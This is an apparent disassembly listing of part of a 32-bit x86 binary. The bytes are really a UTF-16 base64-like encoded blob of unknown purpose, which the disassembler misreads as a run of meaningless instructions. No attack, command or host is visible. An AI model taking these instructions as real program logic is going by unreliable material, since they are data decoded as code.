  409bf2:	50                   	push   %eax
  409bf3:	00 79 00             	add    %bh,0x0(%ecx)
  409bf6:	61                   	popa
  409bf7:	00 47 00             	add    %al,0x0(%edi)
  409bfa:	46                   	inc    %esi
  409bfb:	00 50 00             	add    %dl,0x0(%eax)
  409bfe:	46                   	inc    %esi
  409bff:	00 30                	add    %dh,(%eax)
  409c01:	00 6b 00             	add    %ch,0x0(%ebx)
  409c04:	55                   	push   %ebp
  409c05:	00 78 00             	add    %bh,0x0(%eax)
  409c08:	6f                   	outsl  %ds:(%esi),(%dx)
  409c09:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  409c0d:	00 4e 00             	add    %cl,0x0(%esi)
  409c10:	7a 00                	jp     0x409c12
  409c12:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  409c16:	76 00                	jbe    0x409c18
  409c18:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  409c1b:	00 35 00 41 00 4f    	add    %dh,0x4f004100
  409c21:	00 6a 00             	add    %ch,0x0(%edx)
  409c24:	5a                   	pop    %edx
  409c25:	00 5a 00             	add    %bl,0x0(%edx)
  409c28:	41                   	inc    %ecx
  409c29:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  409c2d:	00 72 00             	add    %dh,0x0(%edx)
  409c30:	73 00                	jae    0x409c32
  409c32:	6f                   	outsl  %ds:(%esi),(%dx)
  409c33:	00 65 00             	add    %ah,0x0(%ebp)
  409c36:	70 00                	jo     0x409c38
  409c38:	33 00                	xor    (%eax),%eax
  409c3a:	70 00                	jo     0x409c3c
  409c3c:	68 00 66 00 6f       	push   $0x6f006600
  409c41:	00 66 00             	add    %ah,0x0(%esi)
  409c44:	74 00                	je     0x409c46
  409c46:	39 00                	cmp    %eax,(%eax)
  409c48:	2b 00                	sub    (%eax),%eax
  409c4a:	67 00 64 00          	add    %ah,0x0(%si)
  409c4e:	42                   	inc    %edx
  409c4f:	00 58 00             	add    %bl,0x0(%eax)
  409c52:	35 00 35 00 37       	xor    $0x37003500,%eax
  409c57:	00 56 00             	add    %dl,0x0(%esi)
  409c5a:	4d                   	dec    %ebp
  409c5b:	00 45 00             	add    %al,0x0(%ebp)
  409c5e:	6f                   	outsl  %ds:(%esi),(%dx)
  409c5f:	00 72 00             	add    %dh,0x0(%edx)
  409c62:	6f                   	outsl  %ds:(%esi),(%dx)
  409c63:	00 49 00             	add    %cl,0x0(%ecx)
  409c66:	52                   	push   %edx
  409c67:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  409c6b:	00 58 00             	add    %bl,0x0(%eax)
  409c6e:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  409c71:	00 47 00             	add    %al,0x0(%edi)
  409c74:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  409c77:	00 6d 00             	add    %ch,0x0(%ebp)
  409c7a:	31 00                	xor    %eax,(%eax)
  409c7c:	2b 00                	sub    (%eax),%eax
  409c7e:	6e                   	outsb  %ds:(%esi),(%dx)
  409c7f:	00 70 00             	add    %dh,0x0(%eax)
  409c82:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  409c86:	30 00                	xor    %al,(%eax)
  409c88:	74 00                	je     0x409c8a
  409c8a:	47                   	inc    %edi
  409c8b:	00 78 00             	add    %bh,0x0(%eax)
  409c8e:	37                   	aaa
  409c8f:	00 46 00             	add    %al,0x0(%esi)
  409c92:	48                   	dec    %eax
  409c93:	00 4d 00             	add    %cl,0x0(%ebp)
  409c96:	72 00                	jb     0x409c98
  409c98:	2b 00                	sub    (%eax),%eax
  409c9a:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  409c9e:	37                   	aaa
  409c9f:	00 47 00             	add    %al,0x0(%edi)
  409ca2:	38 00                	cmp    %al,(%eax)
  409ca4:	35 00 75 00 64       	xor    $0x64007500,%eax
  409ca9:	00 61 00             	add    %ah,0x0(%ecx)
  409cac:	35 00 36 00 54       	xor    $0x54003600,%eax
  409cb1:	00 61 00             	add    %ah,0x0(%ecx)
  409cb4:	49                   	dec    %ecx
  409cb5:	00 69 00             	add    %ch,0x0(%ecx)
  409cb8:	62 00                	bound  %eax,(%eax)
  409cba:	5a                   	pop    %edx
  409cbb:	00 70 00             	add    %dh,0x0(%eax)
  409cbe:	57                   	push   %edi
  409cbf:	00 71 00             	add    %dh,0x0(%ecx)
  409cc2:	69 00 51 00 6d 00    	imul   $0x6d0051,(%eax),%eax
  409cc8:	76 00                	jbe    0x409cca
  409cca:	32 00                	xor    (%eax),%al
  409ccc:	50                   	push   %eax
  409ccd:	00 73 00             	add    %dh,0x0(%ebx)
  409cd0:	37                   	aaa
  409cd1:	00 63 00             	add    %ah,0x0(%ebx)
  409cd4:	56                   	push   %esi
  409cd5:	00 62 00             	add    %ah,0x0(%edx)
  409cd8:	6f                   	outsl  %ds:(%esi),(%dx)
  409cd9:	00 70 00             	add    %dh,0x0(%eax)
  409cdc:	51                   	push   %ecx
  409cdd:	00 32                	add    %dh,(%edx)
  409cdf:	00 5a 00             	add    %bl,0x0(%edx)
  409ce2:	38 00                	cmp    %al,(%eax)
  409ce4:	72 00                	jb     0x409ce6
  409ce6:	4b                   	dec    %ebx
  409ce7:	00 56 00             	add    %dl,0x0(%esi)
  409cea:	39 00                	cmp    %eax,(%eax)
  409cec:	7a 00                	jp     0x409cee
  409cee:	79 00                	jns    0x409cf0
  409cf0:	77 00                	ja     0x409cf2
  409cf2:	43                   	inc    %ebx
  409cf3:	00 4d 00             	add    %cl,0x0(%ebp)
  409cf6:	76 00                	jbe    0x409cf8
  409cf8:	70 00                	jo     0x409cfa
  409cfa:	47                   	inc    %edi
  409cfb:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  409cff:	00 67 00             	add    %ah,0x0(%edi)
  409d02:	66 00 44 00 75       	data16 add %al,0x75(%eax,%eax,1)
  409d07:	00 36                	add    %dh,(%esi)
  409d09:	00 76 00             	add    %dh,0x0(%esi)
  409d0c:	68 00 6f 00 30       	push   $0x30006f00
  409d11:	00 30                	add    %dh,(%eax)
  409d13:	00 75 00             	add    %dh,0x0(%ebp)
  409d16:	4e                   	dec    %esi
  409d17:	00 78 00             	add    %bh,0x0(%eax)
  409d1a:	72 00                	jb     0x409d1c
  409d1c:	4b                   	dec    %ebx
  409d1d:	00 70 00             	add    %dh,0x0(%eax)
  409d20:	53                   	push   %ebx
  409d21:	00 70 00             	add    %dh,0x0(%eax)
  409d24:	5a                   	pop    %edx
  409d25:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  409d29:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  409d2d:	00 47 00             	add    %al,0x0(%edi)
  409d30:	6e                   	outsb  %ds:(%esi),(%dx)
  409d31:	00 4d 00             	add    %cl,0x0(%ebp)
  409d34:	2b 00                	sub    (%eax),%eax
  409d36:	73 00                	jae    0x409d38
  409d38:	47                   	inc    %edi
  409d39:	00 33                	add    %dh,(%ebx)
  409d3b:	00 6d 00             	add    %ch,0x0(%ebp)
  409d3e:	4b                   	dec    %ebx
  409d3f:	00 55 00             	add    %dl,0x0(%ebp)
  409d42:	49                   	dec    %ecx
  409d43:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d46:	6a 00                	push   $0x0
  409d48:	34 00                	xor    $0x0,%al
  409d4a:	30 00                	xor    %al,(%eax)
  409d4c:	31 00                	xor    %eax,(%eax)
  409d4e:	50                   	push   %eax
  409d4f:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  409d53:	00 4b 00             	add    %cl,0x0(%ebx)
  409d56:	5a                   	pop    %edx
  409d57:	00 59 00             	add    %bl,0x0(%ecx)
  409d5a:	34 00                	xor    $0x0,%al
  409d5c:	77 00                	ja     0x409d5e
  409d5e:	61                   	popa
  409d5f:	00 51 00             	add    %dl,0x0(%ecx)
  409d62:	30 00                	xor    %al,(%eax)
  409d64:	43                   	inc    %ebx
  409d65:	00 69 00             	add    %ch,0x0(%ecx)
  409d68:	46                   	inc    %esi
  409d69:	00 36                	add    %dh,(%esi)
  409d6b:	00 43 00             	add    %al,0x0(%ebx)
  409d6e:	4f                   	dec    %edi
  409d6f:	00 59 00             	add    %bl,0x0(%ecx)
  409d72:	38 00                	cmp    %al,(%eax)
  409d74:	55                   	push   %ebp
  409d75:	00 2f                	add    %ch,(%edi)
  409d77:	00 70 00             	add    %dh,0x0(%eax)
  409d7a:	67 00 38             	add    %bh,(%bx,%si)
  409d7d:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  409d81:	00 42 00             	add    %al,0x0(%edx)
  409d84:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  409d88:	48                   	dec    %eax
  409d89:	00 79 00             	add    %bh,0x0(%ecx)
  409d8c:	6f                   	outsl  %ds:(%esi),(%dx)
  409d8d:	00 48 00             	add    %cl,0x0(%eax)
  409d90:	2f                   	das
  409d91:	00 72 00             	add    %dh,0x0(%edx)
  409d94:	47                   	inc    %edi
  409d95:	00 78 00             	add    %bh,0x0(%eax)
  409d98:	39 00                	cmp    %eax,(%eax)
  409d9a:	63 00                	arpl   %eax,(%eax)
  409d9c:	33 00                	xor    (%eax),%eax
  409d9e:	59                   	pop    %ecx
  409d9f:	00 53 00             	add    %dl,0x0(%ebx)
  409da2:	5a                   	pop    %edx
  409da3:	00 4f 00             	add    %cl,0x0(%edi)
  409da6:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  409daa:	57                   	push   %edi
  409dab:	00 5a 00             	add    %bl,0x0(%edx)
  409dae:	43                   	inc    %ebx
  409daf:	00 79 00             	add    %bh,0x0(%ecx)
  409db2:	39 00                	cmp    %eax,(%eax)
  409db4:	54                   	push   %esp
  409db5:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  409db9:	00 47 00             	add    %al,0x0(%edi)
  409dbc:	71 00                	jno    0x409dbe
  409dbe:	57                   	push   %edi
  409dbf:	00 31                	add    %dh,(%ecx)
  409dc1:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  409dc5:	00 30                	add    %dh,(%eax)
  409dc7:	00 65 00             	add    %ah,0x0(%ebp)
  409dca:	77 00                	ja     0x409dcc
  409dcc:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  409dd0:	49                   	dec    %ecx
  409dd1:	00 6d 00             	add    %ch,0x0(%ebp)
  409dd4:	30 00                	xor    %al,(%eax)
  409dd6:	41                   	inc    %ecx
  409dd7:	00 46 00             	add    %al,0x0(%esi)
  409dda:	68 00 5a 00 46       	push   $0x46005a00
  409ddf:	00 78 00             	add    %bh,0x0(%eax)
  409de2:	7a 00                	jp     0x409de4
  409de4:	68 00 51 00 51       	push   $0x51005100
  409de9:	00 77 00             	add    %dh,0x0(%edi)
  409dec:	7a 00                	jp     0x409dee
  409dee:	62 00                	bound  %eax,(%eax)
  409df0:	45                   	inc    %ebp
  409df1:	00 63 00             	add    %ah,0x0(%ebx)
  409df4:	63 00                	arpl   %eax,(%eax)
  409df6:	32 00                	xor    (%eax),%al
  409df8:	69 00 64 00 51 00    	imul   $0x510064,(%eax),%eax
  409dfe:	41                   	inc    %ecx
  409dff:	00 37                	add    %dh,(%edi)
  409e01:	00 30                	add    %dh,(%eax)
  409e03:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  409e07:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
  409e0b:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  409e0f:	00 54 00 35          	add    %dl,0x35(%eax,%eax,1)
  409e13:	00 70 00             	add    %dh,0x0(%eax)
  409e16:	4b                   	dec    %ebx
  409e17:	00 31                	add    %dh,(%ecx)
  409e19:	00 39                	add    %bh,(%ecx)
  409e1b:	00 4a 00             	add    %cl,0x0(%edx)
  409e1e:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  409e22:	68 00 68 00 61       	push   $0x61006800
  409e27:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e2a:	47                   	inc    %edi
  409e2b:	00 31                	add    %dh,(%ecx)
  409e2d:	00 30                	add    %dh,(%eax)
  409e2f:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  409e33:	00 67 00             	add    %ah,0x0(%edi)
  409e36:	35 00 45 00 43       	xor    $0x43004500,%eax
  409e3b:	00 47 00             	add    %al,0x0(%edi)
  409e3e:	5a                   	pop    %edx
  409e3f:	00 68 00             	add    %ch,0x0(%eax)
  409e42:	7a 00                	jp     0x409e44
  409e44:	79 00                	jns    0x409e46
  409e46:	66 00 4c 00 75       	data16 add %cl,0x75(%eax,%eax,1)
  409e4b:	00 68 00             	add    %ch,0x0(%eax)
  409e4e:	54                   	push   %esp
  409e4f:	00 2f                	add    %ch,(%edi)
  409e51:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  409e55:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  409e59:	00 79 00             	add    %bh,0x0(%ecx)
  409e5c:	65 00 30             	add    %dh,%gs:(%eax)
  409e5f:	00 45 00             	add    %al,0x0(%ebp)
  409e62:	61                   	popa
  409e63:	00 48 00             	add    %cl,0x0(%eax)
  409e66:	7a 00                	jp     0x409e68
  409e68:	62 00                	bound  %eax,(%eax)
  409e6a:	45                   	inc    %ebp
  409e6b:	00 51 00             	add    %dl,0x0(%ecx)
  409e6e:	45                   	inc    %ebp
  409e6f:	00 5a 00             	add    %bl,0x0(%edx)
  409e72:	41                   	inc    %ecx
  409e73:	00 42 00             	add    %al,0x0(%edx)
  409e76:	53                   	push   %ebx
  409e77:	00 4f 00             	add    %cl,0x0(%edi)
  409e7a:	49                   	dec    %ecx
  409e7b:	00 69 00             	add    %ch,0x0(%ecx)
  409e7e:	64 00 39             	add    %bh,%fs:(%ecx)
  409e81:	00 6d 00             	add    %ch,0x0(%ebp)
  409e84:	42                   	inc    %edx
  409e85:	00 39                	add    %bh,(%ecx)
  409e87:	00 73 00             	add    %dh,0x0(%ebx)
  409e8a:	4b                   	dec    %ebx
  409e8b:	00 30                	add    %dh,(%eax)
  409e8d:	00 4f 00             	add    %cl,0x0(%edi)
  409e90:	34 00                	xor    $0x0,%al
  409e92:	6a 00                	push   $0x0
  409e94:	2b 00                	sub    (%eax),%eax
  409e96:	6d                   	insl   (%dx),%es:(%edi)
  409e97:	00 51 00             	add    %dl,0x0(%ecx)
  409e9a:	47                   	inc    %edi
  409e9b:	00 71 00             	add    %dh,0x0(%ecx)
  409e9e:	68 00 47 00 56       	push   $0x56004700
  409ea3:	00 62 00             	add    %ah,0x0(%edx)
  409ea6:	45                   	inc    %ebp
  409ea7:	00 49 00             	add    %cl,0x0(%ecx)
  409eaa:	39 00                	cmp    %eax,(%eax)
  409eac:	49                   	dec    %ecx
  409ead:	00 37                	add    %dh,(%edi)
  409eaf:	00 2b                	add    %ch,(%ebx)
  409eb1:	00 55 00             	add    %dl,0x0(%ebp)
  409eb4:	35 00 78 00 6c       	xor    $0x6c007800,%eax
  409eb9:	00 49 00             	add    %cl,0x0(%ecx)
  409ebc:	6b 00 58             	imul   $0x58,(%eax),%eax
  409ebf:	00 33                	add    %dh,(%ebx)
  409ec1:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  409ec5:	00 31                	add    %dh,(%ecx)
  409ec7:	00 67 00             	add    %ah,0x0(%edi)
  409eca:	61                   	popa
  409ecb:	00 51 00             	add    %dl,0x0(%ecx)
  409ece:	62 00                	bound  %eax,(%eax)
  409ed0:	7a 00                	jp     0x409ed2
  409ed2:	44                   	inc    %esp
  409ed3:	00 70 00             	add    %dh,0x0(%eax)
  409ed6:	6f                   	outsl  %ds:(%esi),(%dx)
  409ed7:	00 63 00             	add    %ah,0x0(%ebx)
  409eda:	4d                   	dec    %ebp
  409edb:	00 66 00             	add    %ah,0x0(%esi)
  409ede:	35 00 75 00 50       	xor    $0x50007500,%eax
  409ee3:	00 69 00             	add    %ch,0x0(%ecx)
  409ee6:	42                   	inc    %edx
  409ee7:	00 56 00             	add    %dl,0x0(%esi)
  409eea:	38 00                	cmp    %al,(%eax)
  409eec:	46                   	inc    %esi
  409eed:	00 7a 00             	add    %bh,0x0(%edx)
  409ef0:	73 00                	jae    0x409ef2
  409ef2:	57                   	push   %edi
  409ef3:	00 49 00             	add    %cl,0x0(%ecx)
  409ef6:	61                   	popa
  409ef7:	00 61 00             	add    %ah,0x0(%ecx)
  409efa:	50                   	push   %eax
  409efb:	00 6b 00             	add    %ch,0x0(%ebx)
  409efe:	55                   	push   %ebp
  409eff:	00 55 00             	add    %dl,0x0(%ebp)
  409f02:	44                   	inc    %esp
  409f03:	00 63 00             	add    %ah,0x0(%ebx)
  409f06:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  409f0a:	4d                   	dec    %ebp
  409f0b:	00 46 00             	add    %al,0x0(%esi)
  409f0e:	4d                   	dec    %ebp
  409f0f:	00 48 00             	add    %cl,0x0(%eax)
  409f12:	33 00                	xor    (%eax),%eax
  409f14:	45                   	inc    %ebp
  409f15:	00 39                	add    %bh,(%ecx)
  409f17:	00 51 00             	add    %dl,0x0(%ecx)
  409f1a:	68 00 4b 00 6d       	push   $0x6d004b00
  409f1f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f22:	58                   	pop    %eax
  409f23:	00 53 00             	add    %dl,0x0(%ebx)
  409f26:	2b 00                	sub    (%eax),%eax
  409f28:	4e                   	dec    %esi
  409f29:	00 46 00             	add    %al,0x0(%esi)
  409f2c:	31 00                	xor    %eax,(%eax)
  409f2e:	74 00                	je     0x409f30
  409f30:	6e                   	outsb  %ds:(%esi),(%dx)
  409f31:	00 53 00             	add    %dl,0x0(%ebx)
  409f34:	71 00                	jno    0x409f36
  409f36:	32 00                	xor    (%eax),%al
  409f38:	49                   	dec    %ecx
  409f39:	00 6f 00             	add    %ch,0x0(%edi)
  409f3c:	74 00                	je     0x409f3e
  409f3e:	6c                   	insb   (%dx),%es:(%edi)
  409f3f:	00 65 00             	add    %ah,0x0(%ebp)
  409f42:	56                   	push   %esi
  409f43:	00 6d 00             	add    %ch,0x0(%ebp)
  409f46:	39 00                	cmp    %eax,(%eax)
  409f48:	57                   	push   %edi
  409f49:	00 62 00             	add    %ah,0x0(%edx)
  409f4c:	61                   	popa
  409f4d:	00 4f 00             	add    %cl,0x0(%edi)
  409f50:	2f                   	das
  409f51:	00 4e 00             	add    %cl,0x0(%esi)
  409f54:	48                   	dec    %eax
  409f55:	00 61 00             	add    %ah,0x0(%ecx)
  409f58:	4a                   	dec    %edx
  409f59:	00 37                	add    %dh,(%edi)
  409f5b:	00 66 00             	add    %ah,0x0(%esi)
  409f5e:	71 00                	jno    0x409f60
  409f60:	6c                   	insb   (%dx),%es:(%edi)
  409f61:	00 71 00             	add    %dh,0x0(%ecx)
  409f64:	58                   	pop    %eax
  409f65:	00 4a 00             	add    %cl,0x0(%edx)
  409f68:	73 00                	jae    0x409f6a
  409f6a:	6e                   	outsb  %ds:(%esi),(%dx)
  409f6b:	00 33                	add    %dh,(%ebx)
  409f6d:	00 76 00             	add    %dh,0x0(%esi)
  409f70:	76 00                	jbe    0x409f72
  409f72:	70 00                	jo     0x409f74
  409f74:	72 00                	jb     0x409f76
  409f76:	77 00                	ja     0x409f78
  409f78:	42                   	inc    %edx
  409f79:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  409f7d:	00 59 00             	add    %bl,0x0(%ecx)
  409f80:	49                   	dec    %ecx
  409f81:	00 57 00             	add    %dl,0x0(%edi)
  409f84:	4e                   	dec    %esi
  409f85:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  409f89:	00 49 00             	add    %cl,0x0(%ecx)
  409f8c:	38 00                	cmp    %al,(%eax)
  409f8e:	6e                   	outsb  %ds:(%esi),(%dx)
  409f8f:	00 71 00             	add    %dh,0x0(%ecx)
  409f92:	6d                   	insl   (%dx),%es:(%edi)
  409f93:	00 62 00             	add    %ah,0x0(%edx)
  409f96:	35 00 56 00 4c       	xor    $0x4c005600,%eax
  409f9b:	00 6e 00             	add    %ch,0x0(%esi)
  409f9e:	51                   	push   %ecx
  409f9f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409fa2:	79 00                	jns    0x409fa4
  409fa4:	77 00                	ja     0x409fa6
  409fa6:	30 00                	xor    %al,(%eax)
  409fa8:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  409fac:	66 00 4c 00 6b       	data16 add %cl,0x6b(%eax,%eax,1)
  409fb1:	00 42 00             	add    %al,0x0(%edx)
  409fb4:	5a                   	pop    %edx
  409fb5:	00 52 00             	add    %dl,0x0(%edx)
  409fb8:	71 00                	jno    0x409fba
  409fba:	52                   	push   %edx
  409fbb:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  409fbf:	00 31                	add    %dh,(%ecx)
  409fc1:	00 78 00             	add    %bh,0x0(%eax)
  409fc4:	41                   	inc    %ecx
  409fc5:	00 67 00             	add    %ah,0x0(%edi)
  409fc8:	7a 00                	jp     0x409fca
  409fca:	47                   	inc    %edi
  409fcb:	00 30                	add    %dh,(%eax)
  409fcd:	00 43 00             	add    %al,0x0(%ebx)
  409fd0:	35 00 77 00 4d       	xor    $0x4d007700,%eax
  409fd5:	00 65 00             	add    %ah,0x0(%ebp)
  409fd8:	38 00                	cmp    %al,(%eax)
  409fda:	78 00                	js     0x409fdc
  409fdc:	51                   	push   %ecx
  409fdd:	00 58 00             	add    %bl,0x0(%eax)
  409fe0:	68 00 2f 00 34       	push   $0x34002f00
  409fe5:	00 45 00             	add    %al,0x0(%ebp)
  409fe8:	79 00                	jns    0x409fea
  409fea:	47                   	inc    %edi
  409feb:	00 2b                	add    %ch,(%ebx)
  409fed:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ff0:	6b 00 41             	imul   $0x41,(%eax),%eax
  409ff3:	00 75 00             	add    %dh,0x0(%ebp)
  409ff6:	51                   	push   %ecx
  409ff7:	00 62 00             	add    %ah,0x0(%edx)
  409ffa:	42                   	inc    %edx
  409ffb:	00 6a 00             	add    %ch,0x0(%edx)
  409ffe:	34 00                	xor    $0x0,%al
  40a000:	57                   	push   %edi
  40a001:	00 79 00             	add    %bh,0x0(%ecx)
  40a004:	34 00                	xor    $0x0,%al
  40a006:	53                   	push   %ebx
  40a007:	00 4a 00             	add    %cl,0x0(%edx)
  40a00a:	52                   	push   %edx
  40a00b:	00 51 00             	add    %dl,0x0(%ecx)
  40a00e:	37                   	aaa
  40a00f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a012:	47                   	inc    %edi
  40a013:	00 6b 00             	add    %ch,0x0(%ebx)
  40a016:	34 00                	xor    $0x0,%al
  40a018:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a01c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a01d:	00 59 00             	add    %bl,0x0(%ecx)
  40a020:	61                   	popa
  40a021:	00 71 00             	add    %dh,0x0(%ecx)
  40a024:	4b                   	dec    %ebx
  40a025:	00 66 00             	add    %ah,0x0(%esi)
  40a028:	56                   	push   %esi
  40a029:	00 73 00             	add    %dh,0x0(%ebx)
  40a02c:	34 00                	xor    $0x0,%al
  40a02e:	46                   	inc    %esi
  40a02f:	00 36                	add    %dh,(%esi)
  40a031:	00 4b 00             	add    %cl,0x0(%ebx)
  40a034:	4d                   	dec    %ebp
  40a035:	00 32                	add    %dh,(%edx)
  40a037:	00 36                	add    %dh,(%esi)
  40a039:	00 39                	add    %bh,(%ecx)
  40a03b:	00 63 00             	add    %ah,0x0(%ebx)
  40a03e:	70 00                	jo     0x40a040
  40a040:	54                   	push   %esp
  40a041:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  40a045:	00 67 00             	add    %ah,0x0(%edi)
  40a048:	41                   	inc    %ecx
  40a049:	00 76 00             	add    %dh,0x0(%esi)
  40a04c:	56                   	push   %esi
  40a04d:	00 31                	add    %dh,(%ecx)
  40a04f:	00 30                	add    %dh,(%eax)
  40a051:	00 6b 00             	add    %ch,0x0(%ebx)
  40a054:	6a 00                	push   $0x0
  40a056:	45                   	inc    %ebp
  40a057:	00 46 00             	add    %al,0x0(%esi)
  40a05a:	53                   	push   %ebx
  40a05b:	00 38                	add    %bh,(%eax)
  40a05d:	00 43 00             	add    %al,0x0(%ebx)
  40a060:	2b 00                	sub    (%eax),%eax
  40a062:	54                   	push   %esp
  40a063:	00 2b                	add    %ch,(%ebx)
  40a065:	00 32                	add    %dh,(%edx)
  40a067:	00 4b 00             	add    %cl,0x0(%ebx)
  40a06a:	50                   	push   %eax
  40a06b:	00 66 00             	add    %ah,0x0(%esi)
  40a06e:	76 00                	jbe    0x40a070
  40a070:	51                   	push   %ecx
  40a071:	00 2b                	add    %ch,(%ebx)
  40a073:	00 4f 00             	add    %cl,0x0(%edi)
  40a076:	55                   	push   %ebp
  40a077:	00 63 00             	add    %ah,0x0(%ebx)
  40a07a:	58                   	pop    %eax
  40a07b:	00 70 00             	add    %dh,0x0(%eax)
  40a07e:	63 00                	arpl   %eax,(%eax)
  40a080:	33 00                	xor    (%eax),%eax
  40a082:	6a 00                	push   $0x0
  40a084:	68 00 4a 00 6e       	push   $0x6e004a00
  40a089:	00 69 00             	add    %ch,0x0(%ecx)
  40a08c:	39 00                	cmp    %eax,(%eax)
  40a08e:	57                   	push   %edi
  40a08f:	00 72 00             	add    %dh,0x0(%edx)
  40a092:	45                   	inc    %ebp
  40a093:	00 4e 00             	add    %cl,0x0(%esi)
  40a096:	6b 00 31             	imul   $0x31,(%eax),%eax
  40a099:	00 58 00             	add    %bl,0x0(%eax)
  40a09c:	41                   	inc    %ecx
  40a09d:	00 43 00             	add    %al,0x0(%ebx)
  40a0a0:	38 00                	cmp    %al,(%eax)
  40a0a2:	47                   	inc    %edi
  40a0a3:	00 76 00             	add    %dh,0x0(%esi)
  40a0a6:	54                   	push   %esp
  40a0a7:	00 51 00             	add    %dl,0x0(%ecx)
  40a0aa:	30 00                	xor    %al,(%eax)
  40a0ac:	79 00                	jns    0x40a0ae
  40a0ae:	74 00                	je     0x40a0b0
  40a0b0:	70 00                	jo     0x40a0b2
  40a0b2:	47                   	inc    %edi
  40a0b3:	00 57 00             	add    %dl,0x0(%edi)
  40a0b6:	69 00 61 00 52 00    	imul   $0x520061,(%eax),%eax
  40a0bc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0bd:	00 31                	add    %dh,(%ecx)
  40a0bf:	00 31                	add    %dh,(%ecx)
  40a0c1:	00 66 00             	add    %ah,0x0(%esi)
  40a0c4:	6a 00                	push   $0x0
  40a0c6:	4b                   	dec    %ebx
  40a0c7:	00 4b 00             	add    %cl,0x0(%ebx)
  40a0ca:	75 00                	jne    0x40a0cc
  40a0cc:	50                   	push   %eax
  40a0cd:	00 73 00             	add    %dh,0x0(%ebx)
  40a0d0:	5a                   	pop    %edx
  40a0d1:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40a0d5:	00 4f 00             	add    %cl,0x0(%edi)
  40a0d8:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40a0dc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0dd:	00 6f 00             	add    %ch,0x0(%edi)
  40a0e0:	35 00 32 00 31       	xor    $0x31003200,%eax
  40a0e5:	00 30                	add    %dh,(%eax)
  40a0e7:	00 47 00             	add    %al,0x0(%edi)
  40a0ea:	47                   	inc    %edi
  40a0eb:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40a0ef:	00 43 00             	add    %al,0x0(%ebx)
  40a0f2:	6b 00 57             	imul   $0x57,(%eax),%eax
  40a0f5:	00 75 00             	add    %dh,0x0(%ebp)
  40a0f8:	72 00                	jb     0x40a0fa
  40a0fa:	50                   	push   %eax
  40a0fb:	00 61 00             	add    %ah,0x0(%ecx)
  40a0fe:	78 00                	js     0x40a100
  40a100:	45                   	inc    %ebp
  40a101:	00 4d 00             	add    %cl,0x0(%ebp)
  40a104:	74 00                	je     0x40a106
  40a106:	57                   	push   %edi
  40a107:	00 75 00             	add    %dh,0x0(%ebp)
  40a10a:	53                   	push   %ebx
  40a10b:	00 6f 00             	add    %ch,0x0(%edi)
  40a10e:	4d                   	dec    %ebp
  40a10f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a112:	6d                   	insl   (%dx),%es:(%edi)
  40a113:	00 35 00 38 00 66    	add    %dh,0x66003800
  40a119:	00 70 00             	add    %dh,0x0(%eax)
  40a11c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a11d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a120:	70 00                	jo     0x40a122
  40a122:	56                   	push   %esi
  40a123:	00 4e 00             	add    %cl,0x0(%esi)
  40a126:	4f                   	dec    %edi
  40a127:	00 6a 00             	add    %ch,0x0(%edx)
  40a12a:	45                   	inc    %ebp
  40a12b:	00 77 00             	add    %dh,0x0(%edi)
  40a12e:	68 00 44 00 47       	push   $0x47004400
  40a133:	00 65 00             	add    %ah,0x0(%ebp)
  40a136:	44                   	inc    %esp
  40a137:	00 57 00             	add    %dl,0x0(%edi)
  40a13a:	67 00 6c 00          	add    %ch,0x0(%si)
  40a13e:	32 00                	xor    (%eax),%al
  40a140:	52                   	push   %edx
  40a141:	00 41 00             	add    %al,0x0(%ecx)
  40a144:	30 00                	xor    %al,(%eax)
  40a146:	7a 00                	jp     0x40a148
  40a148:	6f                   	outsl  %ds:(%esi),(%dx)
  40a149:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40a14d:	00 63 00             	add    %ah,0x0(%ebx)
  40a150:	69 00 6d 00 41 00    	imul   $0x41006d,(%eax),%eax
  40a156:	6d                   	insl   (%dx),%es:(%edi)
